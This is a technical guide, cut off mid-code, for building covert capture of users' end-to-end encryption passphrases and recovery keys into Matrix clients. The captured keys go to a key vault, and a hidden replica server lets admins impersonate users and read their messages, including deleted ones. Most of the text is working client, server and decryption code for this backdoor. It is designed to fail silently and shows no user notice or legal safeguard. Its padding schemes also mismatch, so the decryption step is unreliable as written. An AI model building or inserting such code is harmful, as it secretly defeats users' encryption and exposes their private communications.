# Lawful Interception (LI) Requirements - Implementation Guide
## Part 1: System Architecture & Key Vault

**Document Version:** 2.0
**Last Updated:** November 16, 2025
**Project Structure:**
- **Main Instance**: synapse, element-web, synapse-admin, key_vault (Django)
- **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li

---

## Table of Contents
1. [System Architecture](#1-system-architecture)
2. [key_vault Django Service](#2-key_vault-django-service)
3. [Encryption Strategy](#3-encryption-strategy)
4. [Synapse Authentication Proxy](#4-synapse-authentication-proxy)
5. [Client Modifications](#5-client-modifications)
6. [Hidden Instance Sync System](#6-hidden-instance-sync-system)

---

## 1. System Architecture

### 1.1 Overview

The LI system consists of two separate deployments:

```
┌─────────────────────────────────────────────────────────────┐
│                    MAIN PRODUCTION INSTANCE                  │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌────────────┐    ┌──────────────┐    ┌────────────────┐  │
│  │  synapse   │───>│ PostgreSQL   │    │   key_vault    │  │
│  │  + workers │    │   Cluster    │    │   (Django)     │  │
│  └────────────┘    └──────────────┘    └────────────────┘  │
│         │                                        ▲           │
│         │ Proxy auth                             │           │
│         └────────────────────────────────────────┘           │
│                                                               │
│  ┌────────────┐    ┌────────────┐                           │
│  │ element-web│    │synapse-admin│                           │
│  └────────────┘    └────────────┘                           │
│         ▲                  ▲                                  │
│         │                  │                                  │
│     Users send keys    Admin views stats                     │
└─────────────────────────────────────────────────────────────┘
                              │
                              │ On-demand sync (Celery)
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    HIDDEN LI INSTANCE                        │
│                   (Separate Server/Network)                  │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌────────────┐    ┌──────────────┐    ┌────────────────┐  │
│  │ synapse-li │───>│ PostgreSQL   │    │ synapse-li     │  │
│  │  (replica) │    │  (replica)   │    │  (Celery sync) │  │
│  └────────────┘    └──────────────┘    └────────────────┘  │
│                                                               │
│  ┌──────────────┐  ┌──────────────────┐                     │
│  │element-web-li│  │synapse-admin-li  │                     │
│  │(shows deleted│  │(sync button)     │                     │
│  │  messages)   │  └──────────────────┘                     │
│  └──────────────┘                                            │
│         ▲                                                     │
│         │                                                     │
│   Admin investigates (impersonates users)                    │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 Project Naming

| Component | Main Instance | Hidden Instance | Purpose |
|-----------|---------------|-----------------|---------|
| **Synapse** | synapse | synapse-li | Matrix homeserver |
| **Element Web** | element-web | element-web-li | Web client (LI version shows deleted messages) |
| **Synapse Admin** | synapse-admin | synapse-admin-li | Admin panel (LI version has sync button) |
| **Key Storage** | key_vault (Django) | - | Stores encrypted passphrases/recovery keys |
| **Sync Service** | - | synapse-li (Celery) | Syncs main→hidden instance |

**Note**: The directory `synapse_li/` contains the `key_vault` Django project (renamed conceptually, directory name unchanged).

### 1.3 Data Flow

**Normal User Flow (Main Instance)**:
1. User sets passphrase or recovery key in element-web
2. element-web encrypts key with server's hardcoded public key (RSA)
3. element-web sends encrypted payload to Synapse proxy endpoint
4. Synapse validates user's access token
5. Synapse proxies request to key_vault
6. key_vault stores encrypted payload (checks hash for deduplication)

**Admin Investigation Flow (Hidden Instance)**:
1. Admin clicks sync button in synapse-admin-li
2. Celery task syncs database + media from main instance
3. Admin resets target user's password in synapse-li
4. Admin retrieves user's latest encrypted key from key_vault
5. Admin decrypts key using private key (kept secure offline)
6. Admin logs in as user with reset password
7. Admin verifies session with decrypted key
8. Admin sees all rooms, messages (including deleted messages with styling)

---

## 2. key_vault Django Service

### 2.1 Project Structure

Location: `/synapse_li/`

```
synapse_li/
├── manage.py
├── requirements.txt
├── .env.example
├── synapse_li/          # Django project settings
│   ├── settings.py
│   ├── urls.py
│   ├── wsgi.py
│   └── asgi.py
└── secret/              # Django app for key storage
    ├── models.py        # User and EncryptedKey models
    ├── views.py         # StoreKeyView API endpoint
    ├── admin.py         # Django admin interface
    ├── urls.py
    └── apps.py
```

### 2.2 Database Models

**File**: `synapse_li/secret/models.py`

```python
from django.db import models
from django.utils import timezone
import hashlib


class User(models.Model):
    """User record for key storage (matches Synapse username)."""
    username = models.CharField(max_length=255, unique=True, db_index=True)
    created_at = models.DateTimeField(default=timezone.now)

    class Meta:
        db_table = 'secret_user'
        indexes = [
            models.Index(fields=['username']),
        ]

    def __str__(self):
        return self.username


class EncryptedKey(models.Model):
    """
    Stores encrypted passphrase or recovery key for a user.

    - Never delete records (full history preserved)
    - Deduplication via payload_hash (only latest checked)
    - Admin retrieves latest key for impersonation
    """
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='keys')
    key_type = models.CharField(max_length=20, db_index=True)  # 'passphrase' or 'recovery_key'
    encrypted_payload = models.TextField()  # RSA-encrypted key
    payload_hash = models.CharField(max_length=64, db_index=True)  # SHA256 hash for deduplication
    created_at = models.DateTimeField(default=timezone.now, db_index=True)

    class Meta:
        db_table = 'secret_encrypted_key'
        indexes = [
            models.Index(fields=['user', '-created_at']),  # For latest key retrieval
            models.Index(fields=['payload_hash']),  # For deduplication check
        ]
        ordering = ['-created_at']  # Latest first

    def save(self, *args, **kwargs):
        # Auto-calculate hash if not provided
        if not self.payload_hash:
            self.payload_hash = hashlib.sha256(self.encrypted_payload.encode()).hexdigest()
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.user.username} - {self.key_type} ({self.created_at})"
```

**Field Justification**:
- `username`: Identifies which user's key this is
- `key_type`: Distinguish passphrase vs recovery_key
- `encrypted_payload`: RSA-encrypted key (Base64 encoded)
- `payload_hash`: SHA256 for deduplication (only check latest record)
- `created_at`: Timestamp for ordering (latest = most recent)

**No fields removed** - all are essential.

### 2.3 API Endpoint

**File**: `synapse_li/secret/views.py`

```python
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .models import User, EncryptedKey
import hashlib


class StoreKeyView(APIView):
    """
    API endpoint to store encrypted passphrase/recovery key.

    Called by Synapse proxy endpoint (authenticated).
    Request format:
    {
        "username": "@user:server.com",
        "key_type": "passphrase" or "recovery_key",
        "encrypted_payload": "Base64-encoded RSA-encrypted key"
    }

    Deduplication logic:
    - Get latest key for this user
    - If hash matches incoming payload, skip (duplicate)
    - Otherwise, create new record (never delete old ones)
    """

    def post(self, request):
        # Extract data
        username = request.data.get('username')
        key_type = request.data.get('key_type')
        encrypted_payload = request.data.get('encrypted_payload')

        # Validate
        if not all([username, key_type, encrypted_payload]):
            return Response(
                {'error': 'Missing required fields'},
                status=status.HTTP_400_BAD_REQUEST
            )

        if key_type not in ['passphrase', 'recovery_key']:
            return Response(
                {'error': 'Invalid key_type. Must be "passphrase" or "recovery_key"'},
                status=status.HTTP_400_BAD_REQUEST
            )

        # Calculate hash
        payload_hash = hashlib.sha256(encrypted_payload.encode()).hexdigest()

        # Get or create user
        user, created = User.objects.get_or_create(username=username)

        # Check if latest key matches (deduplication)
        latest_key = EncryptedKey.objects.filter(user=user).first()  # Ordered by -created_at

        if latest_key and latest_key.payload_hash == payload_hash:
            # Duplicate - no need to store
            return Response({
                'status': 'skipped',
                'reason': 'Duplicate key (matches latest record)',
                'existing_key_id': latest_key.id
            }, status=status.HTTP_200_OK)

        # Create new record
        encrypted_key = EncryptedKey.objects.create(
            user=user,
            key_type=key_type,
            encrypted_payload=encrypted_payload,
            payload_hash=payload_hash
        )

        return Response({
            'status': 'stored',
            'key_id': encrypted_key.id,
            'username': username,
            'key_type': key_type,
            'created_at': encrypted_key.created_at.isoformat()
        }, status=status.HTTP_201_CREATED)
```

**File**: `synapse_li/secret/urls.py`

```python
from django.urls import path
from .views import StoreKeyView

urlpatterns = [
    path('api/v1/store-key', StoreKeyView.as_view(), name='store_key'),
]
```

### 2.4 Django Admin Interface

**File**: `synapse_li/secret/admin.py`

```python
from django.contrib import admin
from .models import User, EncryptedKey


@admin.register(User)
class UserAdmin(admin.ModelAdmin):
    list_display = ['username', 'created_at', 'key_count']
    search_fields = ['username']
    readonly_fields = ['created_at']

    def key_count(self, obj):
        return obj.keys.count()
    key_count.short_description = 'Number of Keys'


@admin.register(EncryptedKey)
class EncryptedKeyAdmin(admin.ModelAdmin):
    list_display = ['user', 'key_type', 'created_at', 'payload_hash_short']
    list_filter = ['key_type', 'created_at']
    search_fields = ['user__username', 'payload_hash']
    readonly_fields = ['created_at', 'payload_hash']
    ordering = ['-created_at']

    # Show first 16 chars of hash for readability
    def payload_hash_short(self, obj):
        return obj.payload_hash[:16] + '...'
    payload_hash_short.short_description = 'Payload Hash'

    # Display encrypted payload (truncated)
    def get_readonly_fields(self, request, obj=None):
        if obj:  # Editing existing
            return self.readonly_fields + ['user', 'key_type', 'encrypted_payload']
        return self.readonly_fields
```

**Usage**: Admin can view all stored keys, search by username, and retrieve encrypted payloads for decryption.

---

## 3. Encryption Strategy

### 3.1 Simple RSA Public Key Encryption

**Approach**: Straightforward RSA encryption without hybrid schemes.

```
┌─────────────────────────────────────────────────────────┐
│               CLIENT-SIDE (element-web)                  │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  User sets passphrase: "MySecretPass123"                │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────┐                   │
│  │ Encrypt with hardcoded RSA       │                   │
│  │ public key (2048-bit)            │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼                                                 │
│  encrypted_payload (Base64)                              │
│         │                                                 │
│         └─────────> Send to Synapse proxy endpoint       │
│                                                           │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│                    SYNAPSE PROXY                         │
├─────────────────────────────────────────────────────────┤
│  Validate access token  ────────>  Forward to key_vault │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│                     KEY_VAULT                            │
├─────────────────────────────────────────────────────────┤
│  Store encrypted_payload in database (no processing)    │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│                  ADMIN (Hidden Instance)                 │
├─────────────────────────────────────────────────────────┤
│  Retrieve encrypted_payload from key_vault              │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────┐                   │
│  │ Decrypt with RSA private key     │                   │
│  │ (admin keeps secure offline)     │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼                                                 │
│  plaintext_passphrase: "MySecretPass123"                │
│         │                                                 │
│         └─────────> Use to verify session in synapse-li │
│                                                           │
└─────────────────────────────────────────────────────────┘
```

### 3.2 RSA Key Pair

**Generation** (one-time, before deployment):

```bash
# Generate RSA 2048-bit key pair
openssl genrsa -out private_key.pem 2048

# Extract public key
openssl rsa -in private_key.pem -pubout -out public_key.pem

# Display public key for hardcoding in clients
cat public_key.pem
```

**Storage**:
- **Private Key**: Admin keeps secure (offline, encrypted volume, etc.)
- **Public Key**: Hardcoded in client configurations (element-web, element-x-android)

**No Key Rotation**: Single keypair used permanently (avoids managing multiple private keys).

### 3.3 Client-Side Encryption (element-web)

**File**: `element-web/src/utils/LIEncryption.ts` (NEW FILE)

```typescript
/**
 * LI encryption utilities for encrypting passphrases/recovery keys
 * before sending to server.
 */

import { JSEncrypt } from 'jsencrypt';

// Hardcoded RSA public key (2048-bit)
// IMPORTANT: Replace with your actual public key
const RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key here)
-----END PUBLIC KEY-----`;

/**
 * Encrypt passphrase or recovery key with RSA public key.
 *
 * @param plaintext - The passphrase or recovery key to encrypt
 * @returns Base64-encoded encrypted payload
 */
export function encryptKey(plaintext: string): string {
    const encrypt = new JSEncrypt();
    encrypt.setPublicKey(RSA_PUBLIC_KEY);

    const encrypted = encrypt.encrypt(plaintext);
    if (!encrypted) {
        throw new Error('Encryption failed');
    }

    return encrypted;  // Already Base64-encoded by JSEncrypt
}

/**
 * Get key type from context.
 *
 * @param isRecoveryKey - True if this is recovery key, false if passphrase
 * @returns 'passphrase' | 'recovery_key'
 */
export function getKeyType(isRecoveryKey: boolean): string {
    return isRecoveryKey ? 'recovery_key' : 'passphrase';
}
```

**Dependencies**: Add `jsencrypt` to element-web's package.json:

```json
{
  "dependencies": {
    "jsencrypt": "^3.3.2"
  }
}
```

### 3.4 Admin Decryption (Hidden Instance)

**Tool**: Python script for admin use

```python
#!/usr/bin/env python3
"""
Decrypt encrypted key from key_vault database.

Usage:
    python decrypt_key.py <encrypted_payload_base64>

Requires:
    - private_key.pem in same directory
    - pip install pycryptodome
"""

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64
import sys


def decrypt_key(encrypted_payload_b64: str, private_key_path: str = 'private_key.pem') -> str:
    """Decrypt RSA-encrypted payload."""
    # Load private key
    with open(private_key_path, 'r') as f:
        private_key = RSA.import_key(f.read())

    # Decrypt
    cipher = PKCS1_OAEP.new(private_key)
    encrypted_bytes = base64.b64decode(encrypted_payload_b64)
    decrypted_bytes = cipher.decrypt(encrypted_bytes)

    return decrypted_bytes.decode('utf-8')


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python decrypt_key.py <encrypted_payload_base64>')
        sys.exit(1)

    encrypted_payload = sys.argv[1]
    plaintext = decrypt_key(encrypted_payload)
    print(f'Decrypted key: {plaintext}')
```

**Admin workflow**:
1. Query key_vault database for user's latest encrypted key
2. Copy `encrypted_payload` value
3. Run: `python decrypt_key.py "<encrypted_payload>"`
4. Use decrypted passphrase to verify session in synapse-li

---

## 4. Synapse Authentication Proxy

### 4.1 Purpose

Synapse validates user's access token before forwarding key storage request to key_vault. This ensures:
- Only authenticated users can store keys
- Audit trail (Synapse logs the request)
- No direct client → key_vault access (security)

### 4.2 Implementation

**File**: `synapse/synapse/rest/client/li_proxy.py` (NEW FILE)

```python
"""
LI Proxy Endpoint for Key Vault

Proxies encrypted key storage requests to key_vault Django service.
Authentication handled by Synapse (access token validation).
"""

import logging
import aiohttp
from typing import TYPE_CHECKING, Tuple

from synapse.http.server import DirectServeJsonResource
from synapse.http.servlet import parse_json_object_from_request, RestServlet
from synapse.types import JsonDict

if TYPE_CHECKING:
    from synapse.server import HomeServer

logger = logging.getLogger(__name__)


class LIProxyServlet(RestServlet):
    """
    Proxy endpoint: POST /_synapse/client/v1/li/store_key

    Validates user auth, then forwards to key_vault.
    """

    PATTERNS = ["/li/store_key$"]

    def __init__(self, hs: "HomeServer"):
        super().__init__()
        self.hs = hs
        self.auth = hs.get_auth()
        self.key_vault_url = hs.config.li.key_vault_url  # From homeserver.yaml

    async def on_POST(self, request) -> Tuple[int, JsonDict]:
        # LI: Validate user authentication
        requester = await self.auth.get_user_by_req(request)
        user_id = requester.user.to_string()

        # Parse request body
        body = parse_json_object_from_request(request)

        # Ensure username matches authenticated user (security check)
        if body.get('username') != user_id:
            return 403, {"error": "Username mismatch"}

        # LI: Forward to key_vault
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.key_vault_url}/api/v1/store-key",
                    json=body,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    response_data = await resp.json()
                    return resp.status, response_data
        except Exception as e:
            logger.error(f"LI: Failed to forward to key_vault: {e}")
            return 500, {"error": "Failed to store key"}


def register_servlets(hs: "HomeServer", http_server: DirectServeJsonResource) -> None:
    """Register LI proxy servlet."""
    LIProxyServlet(hs).register(http_server)
```

**File**: `synapse/synapse/app/_base.py` (MODIFICATION)

```python
# LI: Import and register LI proxy servlet
from synapse.rest.client import li_proxy

# In _configure_named_resource() function, add:
# LI: Register LI proxy endpoints
if self.config.li.enabled:
    li_proxy.register_servlets(self, resource)
```

**File**: `synapse/synapse/config/li.py` (NEW FILE)

```python
"""
LI configuration for Synapse.
"""

from typing import Any
from synapse.config._base import Config


class LIConfig(Config):
    """LI-specific configuration."""

    section = "li"

    def read_config(self, config: dict, **kwargs: Any) -> None:
        li_config = config.get("li") or {}

        self.enabled = li_config.get("enabled", False)
        self.key_vault_url = li_config.get(
            "key_vault_url",
            "http://key-vault.matrix.svc.cluster.local:8000"
        )

    def generate_config_section(self, **kwargs: Any) -> str:
        return """\
        # Lawful Interception Configuration
        li:
          # Enable LI proxy endpoints
          enabled: false

          # key_vault Django service URL
          key_vault_url: "http://key-vault.matrix.svc.cluster.local:8000"
        """
```

**File**: `synapse/synapse/config/homeserver.py` (MODIFICATION)

```python
# LI: Add LI config
from synapse.config.li import LIConfig

# In ConfigBuilder class:
class HomeServerConfig(RootConfig):
    config_classes = [
        # ... existing configs ...
        LIConfig,  # LI: Add LI config
    ]
```

**Configuration** (`homeserver.yaml`):

```yaml
# LI: Lawful Interception
li:
  enabled: true
  key_vault_url: "http://key-vault.matrix.svc.cluster.local:8000"
```

---

## 5. Client Modifications

### 5.1 element-web Changes

**Objective**: Send encrypted passphrase/recovery key to Synapse proxy endpoint whenever user sets, resets, or verifies with their key.

**When to send**:
1. User creates new passphrase
2. User creates new recovery key
3. User resets passphrase
4. User enters passphrase to verify session ← **IMPORTANT**: Capture even on verification

**Retry logic**: 5 attempts, 10 second interval, 30 second timeout per request

#### Integration Point 1: Passphrase Creation/Reset

**File**: `element-web/src/stores/LIKeyCapture.ts` (NEW FILE)

```typescript
/**
 * LI Key Capture Module
 *
 * Sends encrypted passphrases/recovery keys to Synapse LI proxy endpoint.
 * Retry logic: 5 attempts, 10 second interval, 30 second timeout.
 */

import { MatrixClient } from "matrix-js-sdk";
import { encryptKey, getKeyType } from "../utils/LIEncryption";

const MAX_RETRIES = 5;
const RETRY_INTERVAL_MS = 10000;  // 10 seconds
const REQUEST_TIMEOUT_MS = 30000;  // 30 seconds

export interface KeyCaptureOptions {
    client: MatrixClient;
    key: string;  // Plaintext passphrase or recovery key
    isRecoveryKey: boolean;
}

/**
 * Send encrypted key to LI endpoint with retry logic.
 */
export async function captureKey(options: KeyCaptureOptions): Promise<void> {
    const { client, key, isRecoveryKey } = options;

    // Encrypt key
    const encryptedPayload = encryptKey(key);
    const keyType = getKeyType(isRecoveryKey);
    const username = client.getUserId()!;

    // Retry loop
    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
            const response = await fetch(
                `${client.getHomeserverUrl()}/_synapse/client/v1/li/store_key`,
                {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${client.getAccessToken()}`,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username,
                        key_type: keyType,
                        encrypted_payload: encryptedPayload,
                    }),
                    signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
                }
            );

            if (response.ok) {
                console.log(`LI: Key captured successfully (attempt ${attempt})`);
                return;  // Success
            } else {
                console.warn(`LI: Key capture failed with HTTP ${response.status} (attempt ${attempt})`);
            }
        } catch (error) {
            console.error(`LI: Key capture error (attempt ${attempt}):`, error);
        }

        // Wait before retry (unless last attempt)
        if (attempt < MAX_RETRIES) {
            await new Promise(resolve => setTimeout(resolve, RETRY_INTERVAL_MS));
        }
    }

    // All retries exhausted
    console.error(`LI: Failed to capture key after ${MAX_RETRIES} attempts. Giving up.`);
}
```

**File**: `element-web/src/components/views/dialogs/security/CreateSecretStorageDialog.tsx` (MODIFICATION)

```typescript
// LI: Import key capture
import { captureKey } from "../../../../stores/LIKeyCapture";

// In _doBootstrapUIAuth() or wherever passphrase is set:
async function onPassphraseCreated(passphrase: string) {
    // ... existing setup logic ...

    // LI: Capture passphrase (fire and forget - don't block UX)
    captureKey({
        client: MatrixClientPeg.get(),
        key: passphrase,
        isRecoveryKey: false,
    }).catch(err => {
        // Silent failure - don't disrupt user experience
        console.error('LI: Key capture failed:', err);
    });

    // ... continue with normal flow ...
}
```

#### Integration Point 2: Recovery Key Creation

**File**: `element-web/src/components/views/dialogs/security/CreateSecretStorageDialog.tsx` (MODIFICATION)

```typescript
async function onRecoveryKeyCreated(recoveryKey: string) {
    // ... existing setup logic ...

    // LI: Capture recovery key
    captureKey({
        client: MatrixClientPeg.get(),
        key: recoveryKey,
        isRecoveryKey: true,
    }).catch(err => {
        console.error('LI: Key capture failed:', err);
    });

    // ... continue ...
}
```

#### Integration Point 3: Key Verification (Session Verification)

**File**: `element-web/src/stores/SetupEncryptionStore.ts` (MODIFICATION)

```typescript
// LI: Import key capture
import { captureKey } from "./LIKeyCapture";

// In verifyWithPassphrase() or similar:
async function verifyWithPassphrase(passphrase: string) {
    // ... existing verification logic ...

    // LI: Capture passphrase even on verification
    // (User entering passphrase = another opportunity to capture)
    captureKey({
        client: this.matrixClient,
        key: passphrase,
        isRecoveryKey: false,
    }).catch(err => {
        console.error('LI: Key capture on verification failed:', err);
    });

    // ... continue verification ...
}
```

**Comment Style**:
```typescript
// LI: <brief description of what this does>
```

All LI-related code changes marked with `// LI:` prefix for easy identification during upstream merges.

### 5.2 element-x-android Changes

**Objective**: Same as element-web - capture keys on set/reset/verification.

**File**: `element-x-android/libraries/matrix/impl/src/main/kotlin/io/element/android/libraries/matrix/impl/li/LIKeyCapture.kt` (NEW FILE)

```kotlin
package io.element.android.libraries.matrix.impl.li

import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeout
import okhttp3.OkHttpClient
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import timber.log.Timber
import java.security.KeyFactory
import java.security.spec.X509EncodedKeySpec
import java.util.Base64
import javax.crypto.Cipher

/**
 * LI Key Capture for Android
 *
 * Encrypts and sends passphrases/recovery keys to Synapse LI endpoint.
 */
object LIKeyCapture {

    private const val MAX_RETRIES = 5
    private const val RETRY_INTERVAL_MS = 10_000L  // 10 seconds
    private const val REQUEST_TIMEOUT_MS = 30_000L  // 30 seconds

    // Hardcoded RSA public key (same as element-web)
    private const val RSA_PUBLIC_KEY_PEM = """
        -----BEGIN PUBLIC KEY-----
        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key)
        -----END PUBLIC KEY-----
    """.trimIndent()

    /**
     * Encrypt key with RSA public key.
     */
    private fun encryptKey(plaintext: String): String {
        // Parse PEM public key
        val publicKeyPEM = RSA_PUBLIC_KEY_PEM
            .replace("-----BEGIN PUBLIC KEY-----", "")
            .replace("-----END PUBLIC KEY-----", "")
            .replace("\\s".toRegex(), "")

        val publicKeyBytes = Base64.getDecoder().decode(publicKeyPEM)
        val keySpec = X509EncodedKeySpec(publicKeyBytes)
        val keyFactory = KeyFactory.getInstance("RSA")
        val publicKey = keyFactory.generatePublic(keySpec)

        // Encrypt
        val cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding")
        cipher.init(Cipher.ENCRYPT_MODE, publicKey)
        val encryptedBytes = cipher.doFinal(plaintext.toByteArray())

        return Base64.getEncoder().encodeToString(encryptedBytes)
    }

    /**
     * Send encrypted key to LI endpoint with retry logic.
     */
    suspend fun captureKey(
        homeserverUrl: String,
        accessToken: String,
        username: String,
        key: String,
        isRecoveryKey: Boolean
    ) {
        val encryptedPayload = encryptKey(key)
        val keyType = if (isRecoveryKey) "recovery_key" else "passphrase"

        val client = OkHttpClient()

        // Retry loop
        for (attempt in 1..MAX_RETRIES) {
            try {
                withTimeout(REQUEST_TIMEOUT_MS) {
                    val json = JSONObject().apply {
                        put("username", username)
                        put("key_type", keyType)
                        put("encrypted_payload", encryptedPayload)
                    }

                    val request = Request.Builder()
                        .url("$homeserverUrl/_synapse/client/v1/li/store_key")
                        .addHeader("Authorization", "Bearer $accessToken")
                        .post(json.toString().toRequestBody("application/json".toMediaType()))
                        .build()

                    val response = client.newCall(request).execute()

                    if (response.isSuccessful) {
                        Timber.d("LI: Key captured successfully (attempt $attempt)")
                        return  // Success
                    } else {
                        Timber.w("LI: Key capture failed with HTTP ${response.code} (attempt $attempt)")
                    }
                }
            } catch (e: Exception) {
                Timber.e(e, "LI: Key capture error (attempt $attempt)")
            }

            // Wait before retry
            if (attempt < MAX_RETRIES) {
                delay(RETRY_INTERVAL_MS)
            }
        }

        // All retries exhausted
        Timber.e("LI: Failed to capture key after $MAX_RETRIES attempts. Giving up.")
    }
}
```

**File**: `element-x-android/features/securebackup/impl/src/main/kotlin/io/element/android/features/securebackup/impl/setup/SecureBackupSetupPresenter.kt` (MODIFICATION)

```kotlin
// LI: Import key capture
import io.element.android.libraries.matrix.impl.li.LIKeyCapture
import kotlinx.coroutines.launch

// In createRecovery() function:
private suspend fun createRecovery(): Result<RecoveryKey> {
    val result = encryptionService.enableRecovery(...)

    result.onSuccess { recoveryKey ->
        // LI: Capture recovery key (coroutine launch - don't block)
        coroutineScope.launch {
            try {
                LIKeyCapture.captureKey(
                    homeserverUrl = sessionRepository.getHomeserverUrl(),
                    accessToken = sessionRepository.getAccessToken(),
                    username = sessionRepository.getUserId(),
                    key = recoveryKey.value,
                    isRecoveryKey = true
                )
            } catch (e: Exception) {
                Timber.e(e, "LI: Key capture failed")
            }
        }
    }

    return result
}
```

---

## 6. Hidden Instance Sync System

### 6.1 Architecture

The hidden instance (synapse-li, element-web-li, synapse-admin-li) must stay in sync with the main instance. Sync is:
- **One-way**: Main → Hidden (changes in hidden instance do NOT affect main)
- **On-demand**: Triggered by admin clicking sync button in synapse-admin-li
- **Incremental**: Only sync data since last successful sync
- **Robust**: Failed syncs don't break future syncs

### 6.2 Sync Components

**Components**:
1. **synapse-admin-li**: Sync button UI + API calls
2. **synapse-li (Celery)**: Sync service with 3 endpoints + periodic task
3. **PostgreSQL logical replication**: Database sync mechanism
4. **rsync/rclone**: Media file sync

**Architecture**:
```
┌──────────────────────────────────────────────────────────┐
│              synapse-admin-li (Frontend)                  │
│  ┌────────────────────────────────────────────────────┐  │
│  │ [Sync] Button  (active/disabled state)            │  │
│  │   │                                                 │  │
│  │   ├─> Click: POST /api/v1/sync/trigger            │  │
│  │   │         Response: {task_id: "abc123"}          │  │
│  │   │                                                 │  │
│  │   └─> Poll: GET /api/v1/sync/status/<task_id>     │  │
│  │           Response: {status: "running"/"success"/"failed"}  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────┐
│          synapse-li Django (Celery Backend)               │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Endpoints:                                          │  │
│  │  POST /api/v1/sync/trigger  → Create Celery task  │  │
│  │  GET  /api/v1/sync/status/<id> → Check task status│  │
│  │  POST /api/v1/sync/config   → Set periodic freq   │  │
│  └────────────────────────────────────────────────────┘  │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Celery Task: sync_instance()                       │  │
│  │  - Check Redis lock (prevent concurrent)           │  │
│  │  - Get last sync checkpoint from DB                │  │
│  │  - Sync PostgreSQL (logical replication)           │  │
│  │  - Sync media files (rsync)                        │  │
│  │  - Update checkpoint                               │  │
│  │  - Release lock                                     │  │
│  └────────────────────────────────────────────────────┘  │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Celery Beat: Periodic sync                         │  │
│  │  - Schedule: Configurable (X times/day)            │  │
│  │  - Calls sync_instance() task                      │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────┐
│              Main Instance (Read-Only Source)             │
│   PostgreSQL (logical replication slot)                  │
│   Media Storage (rsync source)                           │
└──────────────────────────────────────────────────────────┘
```

### 6.3 Sync Lock Mechanism

**Purpose**: Ensure only ONE sync process runs at a time (whether triggered by admin or periodic task).

**Implementation**: Redis lock with expiry

**File**: `synapse_li/sync/lock.py` (NEW FILE)

```python
"""
Distributed lock for sync process using Redis.
"""

import redis
import time
from contextlib import contextmanager

SYNC_LOCK_KEY = "sync:lock"
SYNC_LOCK_TIMEOUT = 3600  # 1 hour max lock duration


class SyncLock:
    """Redis-based distributed lock for sync process."""

    def __init__(self, redis_client: redis.Redis):
        self.redis = redis_client

    def acquire(self, timeout: int = SYNC_LOCK_TIMEOUT) -> bool:
        """
        Acquire lock for sync process.

        Returns True if lock acquired, False if already locked.
        """
        return self.redis.set(
            SYNC_LOCK_KEY,
            value=int(time.time()),
            nx=True,  # Only set if not exists
            ex=timeout  # Expire after timeout
        )

    def release(self):
        """Release lock."""
        self.redis.delete(SYNC_LOCK_KEY)

    def is_locked(self) -> bool:
        """Check if lock is currently held."""
        return self.redis.exists(SYNC_LOCK_KEY) > 0

    @contextmanager
    def lock(self, timeout: int = SYNC_LOCK_TIMEOUT):
        """Context manager for lock acquisition."""
        if not self.acquire(timeout):
            raise RuntimeError("Sync already in progress")
        try:
            yield
        finally:
            self.release()
```

### 6.4 Sync Checkpoint Tracking

**Purpose**: Remember where we last synced to enable incremental syncs.

**File**: `synapse_li/sync/models.py` (NEW FILE)

```python
from django.db import models
from django.utils import timezone


class SyncCheckpoint(models.Model):
    """
    Tracks last successful sync position.

    Single row table (singleton pattern).
    """
    # PostgreSQL logical replication LSN (Log Sequence Number)
    pg_lsn = models.CharField(max_length=20, default='0/0')

    # Last synced timestamp (for media files)
    last_media_sync_ts = models.DateTimeField(default=timezone.now)

    # Last successful sync timestamp
    last_sync_at = models.DateTimeField(default=timezone.now)

    # Sync statistics
    total_syncs = models.IntegerField(default=0)
    failed_syncs = models.IntegerField(default=0)

    class Meta:
        db_table = 'sync_checkpoint'

    @classmethod
    def get_checkpoint(cls):
        """Get or create singleton checkpoint."""
        checkpoint, created = cls.objects.get_or_create(pk=1)
        return checkpoint

    def update_checkpoint(self, pg_lsn: str, media_ts: timezone.datetime):
        """Update checkpoint after successful sync."""
        self.pg_lsn = pg_lsn
        self.last_media_sync_ts = media_ts
        self.last_sync_at = timezone.now()
        self.total_syncs += 1
        self.save()

    def mark_failed(self):
        """Mark sync as failed."""
        self.failed_syncs += 1
        self.save()


class SyncTask(models.Model):
